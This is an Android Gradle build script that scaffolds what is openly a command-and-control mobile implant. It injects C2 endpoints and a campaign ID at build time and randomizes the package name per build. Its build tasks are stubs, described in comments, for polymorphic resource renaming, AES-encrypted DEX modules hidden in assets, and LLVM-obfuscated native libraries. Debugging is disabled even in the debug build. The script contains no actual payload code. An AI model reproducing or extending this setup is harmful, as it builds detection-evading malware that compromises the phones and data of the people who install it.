plugins {
    id("com.android.application")
    kotlin("android")
    kotlin("kapt")
}

android {
    compileSdk = 33
    
    defaultConfig {
        applicationId = "com.random.package.name" // Randomized per build
        minSdk = 26
        targetSdk = 33
        versionCode = 1
        versionName = "1.0"
        
        // Embedded configuration (encrypted)
        buildConfigField("String", "ENV_KEY_HASH", "\"${System.getenv("ENV_KEY_HASH") ?: ""}\"")
        buildConfigField("String", "CAMPAIGN_ID", "\"${System.getenv("CAMPAIGN_ID") ?: ""}\"")
        buildConfigField("String", "C2_ENDPOINTS", "\"${System.getenv("C2_ENDPOINTS") ?: ""}\"")
        
        // Polymorphic resource names
        resourcePrefix = "random_" // Changes per build
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_11
        targetCompatibility = JavaVersion.VERSION_11
    }

    kotlinOptions {
        jvmTarget = "11"
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            
            // Custom obfuscation
            signingConfig = signingConfigs.getByName("release")
        }
        
        debug {
            isMinifyEnabled = false
            isDebuggable = false // Disable debugging even in debug build
        }
    }

    // Custom source sets (one per build variant)
    sourceSets {
        getByName("main") {
            jniLibs.srcDirs += "src/main/jniLibs" // Native libraries (Rust)
            assets.srcDirs += "src/main/assets"   // Encrypted modules
        }
    }

    // Namespace
    namespace = "com.random.package.name" // Randomized per build

    // Disable analytics/telemetry
    dependenciesInfo {
        includeInBundle = false
        includeInApk = false
    }
}

dependencies {
    // Core Android
    implementation("androidx.core:core-ktx:1.10.1")
    implementation("androidx.appcompat:appcompat:1.6.1")
    implementation("androidx.work:work-runtime-ktx:2.8.1")
    
    // Networking
    implementation("com.squareup.okhttp3:okhttp:4.11.0")
    implementation("com.squareup.okhttp3:okhttp-ws:4.11.0")
    
    // MQTT
    implementation("org.eclipse.paho:org.eclipse.paho.client.mqttv3:1.2.5")
    
    // Crypto
    implementation("androidx.security:security-crypto:1.1.0-alpha06")
    implementation("org.bouncycastle:bcprov-jdk15on:1.70")
    
    // Logging
    implementation("com.jakewharton.timber:timber:5.0.1")
    
    // JSON
    implementation("com.google.code.gson:gson:2.10.1")
    implementation("com.fasterxml.jackson.core:jackson-databind:2.15.2")
    
    // Firebase (optional, for FCM)
    implementation("com.google.firebase:firebase-messaging:23.2.1")
    
    // Testing
    testImplementation("junit:junit:4.13.2")
    androidTestImplementation("androidx.test.ext:junit:1.1.5")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.5.1")
}

// Custom build tasks

tasks.register("generatePolymorphicResources") {
    doLast {
        // Generate unique resource names per build
        // Randomize class names, method names, string IDs
        // Output to src/main/res/values/strings.xml
    }
}

tasks.register("encryptModules") {
    doLast {
        // Encrypt builtin DEX modules
        // Place in src/main/assets/
        // AES-256-GCM encryption with device-specific key
    }
}

tasks.register("obfuscateNative") {
    doLast {
        // Apply LLVM obfuscation to native libraries
        // Compile Rust libraries with unique obfuscation seeds
    }
}

// Hook into build process
afterEvaluate {
    tasks.named("preBuild") {
        dependsOn(
            "generatePolymorphicResources",
            "encryptModules",
            "obfuscateNative"
        )
    }
}
